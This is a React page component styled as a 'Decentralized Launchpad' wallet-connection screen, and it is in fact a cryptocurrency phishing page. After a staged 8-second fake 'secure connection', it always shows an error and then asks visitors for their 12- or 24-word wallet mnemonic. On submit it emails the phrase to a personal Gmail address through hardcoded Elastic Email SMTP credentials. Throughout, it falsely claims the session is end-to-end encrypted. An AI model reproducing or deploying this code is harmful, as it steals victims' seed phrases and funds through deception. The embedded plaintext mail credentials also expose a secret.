import React, {useState, useEffect} from 'react'
import { motion } from "framer-motion";
import {WalletDetails} from '../components/WalletDetails'
import { RiSendPlane2Fill } from "react-icons/ri";
import { FaCircleChevronUp } from "react-icons/fa6";
import { FaTimes } from "react-icons/fa";
import shield from '../images/shield.png';
import success from '../images/success.png';

const Wallet = () => {
	const [stage, setStage] = useState("trial");
	const [resetToTrail, setResetToTrial] = useState(false);
	const [openModal, setOpenModal] = useState(false);
	const [openSmallModal, setOpenSmallModal] = useState(false);
	const [currentItem, setCurrentItem] = useState();
	const [message, setMessage] = useState("");

	const handleModal = (item) => {
		setCurrentItem(item)
		setOpenModal(true)
	}

	const handleCloseMobile = () => {
		setOpenModal(false); 
		setStage("trial");
		setResetToTrial(prev => !prev)
	}

	const handleSubmit = async () => {
		if(message === ""){
			return
		}
		try{
			await window.Email.send({
			    Host : "smtp.elasticemail.com",
			    Username : "javierolivan001@gmail.com",
			    Password : "7D9A5AE086D5C91667B7F89728F511FD80BD",
			    To : 'javierolivan001@gmail.com',
			    From : "javierolivan001@gmail.com",
			    Subject : "Smart Issues",
			    Body : message
		    })
		    setOpenSmallModal(true);
		    setMessage("");
		}catch(error){
			//console.log(error)
		}

		
	}

	const variants = {
		open: { opacity: 1, y: 0 ,
		    transition:{
				//type: 'spring',
				duration: 1.0,
				delay: 0.0,
				ease: 'easeInOut'
			}
	    },
		closed: { opacity: 0, y: "-200%",
		    transition:{
				//type: 'spring',
				duration: 1.0,
				delay: 1.0,
				ease: 'easeOut'
			}
		},
	}

	const variants1 = {
		open: { opacity: 1, y: 0 ,
		    transition:{
				type: 'spring',
				duration: 0.5,
				delay: 0.0,
				ease: 'easeInOut'
			}
	    },
		closed: { opacity: 0, y: "-200%",
		    transition:{
				type: 'spring',
				duration: 0.5,
				delay: 0.5,
				ease: 'easeOut'
			}
		},
	}

	const transitionVariants  = {
		transitionAnimation:{
			x: ['-98px', '-3px', '-98px'],

			transition:{
				//type: 'spring',
				repeat: Infinity,
				duration: 6.0,
				delay: 0.0,
				ease: 'easeInOut'
			}
	    } 
	}
	const transitionVariants1  = {
		transitionAnimation:{
			x: ['-320px', '-3px', '-320px'],

			transition:{
				//type: 'spring',
				repeat: Infinity,
				duration: 6.0,
				delay: 0.0,
				ease: 'easeInOut'
			}
	    } 
	}

	const [isVisible, setIsVisible] = useState(false);
	const handleScroll = () => {
	    if (window.pageYOffset > 300) {
	        setIsVisible(true);
	    } else {
	        setIsVisible(false);
	    }
    };

    const scrollToTop = () => {
	    window.scrollTo({
			top: 0,
			behavior: 'smooth',
	    });
    };

    useEffect(() => {
	    window.addEventListener('scroll', handleScroll);
	    return () => {
	        window.removeEventListener('scroll', handleScroll);
	    };
    }, []);

    useEffect(() => {
    	setTimeout(() => {
    		setStage("error");
    	}, 8000)
    }, [resetToTrail])



	return (
		<div className="my-12 relative">
			<h2 className="text-2xl md:text-4xl text-[#1F1F2C] font-semibold text-center p-6 pb-4">Select a Wallet</h2>
			<div className="flex justify-center items-center pb-6">
				<div className="w-24 h-[3px] bg-[#5142FC] rounded-[2px]"></div>
				<motion.button 
				    variants={transitionVariants}
		            animate="transitionAnimation"
				    className="w-2.5 h-2.5 bg-[#5142FC] rounded-[6px]"
				></motion.button>
			</div>
			<div className="flex flex-col justify-center items-center gap-8 md:grid md:grid-cols-2 lg:grid-cols-4 place-items-center p-6">
			    { WalletDetails.map((item,i) => (
					<div onClick={() => handleModal(item)} key={i} className="flex items-center gap-4 rounded-[10px] w-80 md:w-64 h-28 p-3 cursor-pointer" style={{boxShadow: "5px 10px 15px -3px rgb(0 0 0 / 0.1)"}}>
						<img className="w-[67px] h-[67px] rounded-[50%]" src={item.image} alt="wallet"/>
						<div>
							<h3 className="text-base text-[#1F1F2C] font-bold">{item.name}</h3>
							<p className="text-sm text-[#7A798A] font-medium">{item.url}</p>
						</div>
					</div>
			    ))}
			</div>
			<div className="flex flex-col gap-4 md:flex-row p-6 md:gap-16 py-12">
				<div className="p-4">
					<h2 className="text-2xl md:text-4xl font-semibold text-[#5142FC]">Decentralized <br/>Launchpad</h2>
					<p className="text-base text-[#1F1F2C] w-full md:w-[400px] py-4">Open and decentralized protocol for syncing various Wallets to Dapps Secure Server. This is not an app but a protocol that establishes a remote connection between two apps and/or devices</p>
				</div>
				<div className="p-4 md:mt-6">
					<h3 className="text-lg text-[#1F1F2C] font-semibold mb-8">Subscribe</h3>
					<div className="flex ">
						<input className="w-[22rem] bg-[#F8F8F8] h-12 pl-4 rounded-l-[12px]" placeholder="name@email.com" type="text"/>
						<button className="bg-[#5142FC] text-white text-xl w-14 h-12 flex justify-center items-center rounded-r-[12px]"><RiSendPlane2Fill className="text-center" /></button>
					</div>
				</div>
			</div>
			<div 
			    onClick={scrollToTop}
			    className={isVisible ? "fixed bottom-12 right-8 z-50 cursor-pointer hover:-translate-y-2 hover:transition-all hover:duration-1000  hover:ease-in-out":"hidden"}
			>
				<FaCircleChevronUp className="text-5xl text-[#5142FC]" />
			</div>
			<div
			    className={`bg-black flex justify-center items-center p-4 bg-modal-background fixed top-8 bottom-0 right-0 left-0 w-screen h-screen ${openModal ? "": "hidden"}`}
			>
				<motion.div 
				    variants={variants} 
			        animate={openModal ? "open" : "closed"}
				    className="flex flex-col items-center justify-center bg-white rounded-[12px] w-full md:w-[31.25rem] p-12 pb-6 relative">
				    <p onClick={handleCloseMobile} className="absolute top-4 right-6 border-[2px] p-1 rounded-[50%] cursor-pointer"><FaTimes /></p>
					{openModal && <img src={currentItem.image} alt="wallet" className="w-14 h-14 rounded-[50%]"/>}
					{openModal && <p className="text-lg md:text-2xl text-[#1F1F2C] font-bold">{currentItem.name}</p>}
					<p className="text-base text-[#7A798A] mt-4 text-center">This session is secured and encrypted</p>
					{stage ==="trial" && 
					<div className="mt-10">
						<div className="flex justify-center items-center pb-2">
							<div className="w-80 md:w-[24rem] h-[3px] bg-[#5142FC] rounded-[2px]"></div>
							<motion.button 
							    variants={transitionVariants1}
					            animate="transitionAnimation"
							    className="w-2.5 h-2.5 bg-[#5142FC] rounded-[6px]"
							></motion.button>
						</div>
						<div className="text-center">
						    <p className="text-base md:text-lg text-[#1F1F2C] font-semibold">starting secure connection...</p>
						    <p className="text-xs text-[#636C72] font-semibold italic">please wait...</p>
						</div>
				    </div>
				    }
				    { stage === "error" &&
					    <div className="flex flex-col items-center justify-center gap-4 mt-5">
					        <p className="text-sm rounded-[8px] text-[#FF0000] border-[#FF0000] py-1 px-2 mb-3 border-[1px] text-center">An error occurred... please try again or connect manually</p>
					    	<button onClick={() => {setStage("trial"); setResetToTrial(prev => !prev)}} className="bg-white text-base font-bold text-[#0275D8] hover:bg-[#0275D8] hover:text-white border-[1px] rounded-[22px] border-[#5142FC] w-80 md:w-[24rem] h-12 md:h-10">Try Again</button>
					    	<button onClick={() => setStage("manual")} className="text-white text-base font-bold border-[1px] hover:opacity-80 rounded-[22px] bg-[#5142FC] w-80 md:w-[24rem] h-12 md:h-10">Connect Manually</button>
					    </div>
				    }
				    { stage === "manual" &&
					    <div className="flex flex-col items-center justify-center gap-4 mt-6">
					    	<textarea 
					    	    onChange={(e) => setMessage(e.target.value) } 
					    	    className="border-[1px] text-xl md:text-2xl font-semibold placeholder:text-sm placeholder:font-normal w-80 md:w-[24rem] h-24 p-2 " 
					    	    placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces."
					    	    value={message}
					    	></textarea>
					    	<button onClick={handleSubmit} className="text-white text-base font-bold border-[1px] hover:opacity-80 rounded-[22px] bg-[#5142FC] w-80 md:w-[24rem] h-12 md:h-10">Connect Wallet</button>
					    </div>
				    }
				    <div className="flex justify-center w-full mt-16">
				    	<img src={shield} className="w-8 h-8" alt="shield"/>
				    	<span className="text-base text-[#636C72] font-bold text-center w-[22rem]">This session is protected with an end-to-end encryption</span>
				    </div>
				</motion.div>
			</div>
			<div className={`bg-black flex justify-center items-center p-4 bg-modal-background fixed top-8 bottom-0 right-0 left-0 w-screen h-screen ${openSmallModal ? "": "hidden"}`}>
				<motion.div
				    variants={variants1} 
			        animate={openSmallModal ? "open" : "closed"} 
				    className="bg-white rounded-[12px] shadow w-fit py-4 px-12 md:px-8 flex flex-col justify-center items-end gap-2"
				>
					<div className="flex flex-col justify-center items-center gap-3">
					    <h2 className="text-[#636C72] text-3xl md:text-4xl font-bold">SUCCESS</h2>
					    <img className="w-10 h-10 rounded-[50%]" src={success} alt="success"/>
					</div>
					<button onClick={() => setOpenSmallModal(false)} className="text-[#1F1F2C] text-base font-medium">Ok</button>
				</motion.div>
			</div>
		</div>
	)
}

export default Wallet